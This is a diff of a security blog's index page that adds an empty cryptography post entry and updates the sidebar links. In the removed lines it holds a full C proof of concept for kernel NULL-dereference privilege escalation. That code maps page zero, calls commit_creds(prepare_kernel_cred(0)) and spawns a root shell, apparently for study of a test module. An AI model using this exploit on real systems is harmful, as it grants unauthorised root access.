@@ -9,7 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="R.L. Rivest, A. Shamir, and L. Adleman 의 그 논문. here
+  <meta name="description" content="
 ">
   
 
@@ -66,6 +66,35 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/07/new-directions-in-cryptography/">New Directions in Cryptography</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-07T10:24:26+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:24 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content">
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1145,137 +1174,6 @@ adbd run as root in the next reboot.</p>
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/05/25/much-ado-about-null-exploiting/">Much Ado About Null Exploiting</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-05-25T00:06:55+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:06 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><a href="https://blogs.oracle.com/ksplice/entry/much_ado_about_null_exploiting1">Much Ado About Null Exploiting</a></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;sys/mman.h&gt;
-</span><span class='line'>#include &lt;stdio.h&gt;
-</span><span class='line'>#include &lt;stdlib.h&gt;
-</span><span class='line'>#include &lt;fcntl.h&gt;
-</span><span class='line'>
-</span><span class='line'>struct cred;
-</span><span class='line'>struct task_struct;
-</span><span class='line'>
-</span><span class='line'>typedef struct cred *(*prepare_kernel_cret_t)(struct task_struct *daemon) __attribute__((regparm(3)));
-</span><span class='line'>typedef int (*commit_creds_t)(struct cred *new) __attribute__((regparm(3)));
-</span><span class='line'>
-</span><span class='line'>prepare_kernel_cret_t prepare_kernel_cred;
-</span><span class='line'>commit_creds_t commit_creds;
-</span><span class='line'>
-</span><span class='line'>void *get_ksym(char *name) {
-</span><span class='line'>    FILE *f = fopen("/proc/kallsyms", "rb");
-</span><span class='line'>    char c,sym[512];
-</span><span class='line'>    void *addr;
-</span><span class='line'>    int ret;
-</span><span class='line'>    while (fscanf(f,"%p %c %s\n", &addr, &c, sym) &gt; 0)
-</span><span class='line'>        if (!strcmp(sym,name)) return addr;
-</span><span class='line'>    return NULL;
-</span><span class='line'>}
-</span><span class='line'>
-</span><span class='line'>void get_root(void) { commit_creds(prepare_kernel_cred(0)); }
-</span><span class='line'>
-</span><span class='line'>int main() {
-</span><span class='line'>    prepare_kernel_cred = get_ksym("prepare_kernel_cred");
-</span><span class='line'>    commit_creds = get_ksym("commit_creds");
-</span><span class='line'>
-</span><span class='line'>    if (!prepare_kernel_cred || !commit_creds) {
-</span><span class='line'>        fprintf(stderr, "Kernel symbols not found.");
-</span><span class='line'>        exit(1);
-</span><span class='line'>    }
-</span><span class='line'>
-</span><span class='line'>    mmap(0,4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
-</span><span class='line'>    void (**fn)(void) = NULL;
-</span><span class='line'>    *fn = get_root;
-</span><span class='line'>
-</span><span class='line'>    int fd = open("/sys/kernel/debug/nullderef/null_call", O_WRONLY);
-</span><span class='line'>    write(fd, "1", 1);
-</span><span class='line'>    close(fd);
-</span><span class='line'>
-</span><span class='line'>    if (getuid() == 0) {
-</span><span class='line'>        char *argv[] = { "/bin/sh", NULL }
-</span><span class='line'>        execve("/bin/sh", argv, NULL);
-</span><span class='line'>    }
-</span><span class='line'>    fprintf(stderr, "Something went wrong.");
-</span><span class='line'>    return 1;
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/6">&larr; Older</a>
@@ -1293,6 +1191,10 @@ adbd run as root in the next reboot.</p>
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2015/12/23/on-the-juniper-backdoor/">On the Juniper Backdoor</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2015/12/07/trustnone/">TRUSTNONE</a>
       </li>
     
@@ -1306,10 +1208,6 @@ adbd run as root in the next reboot.</p>
     
       <li class="post">
         <a href="/blog/2015/09/17/rop-and-arm/">ROP and ARM</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/09/13/sophail-applied-attacks-against-sophos-antivirus/">Sophail: Applied Attacks Against Sophos Antivirus</a>
       </li>
     
   </ul>
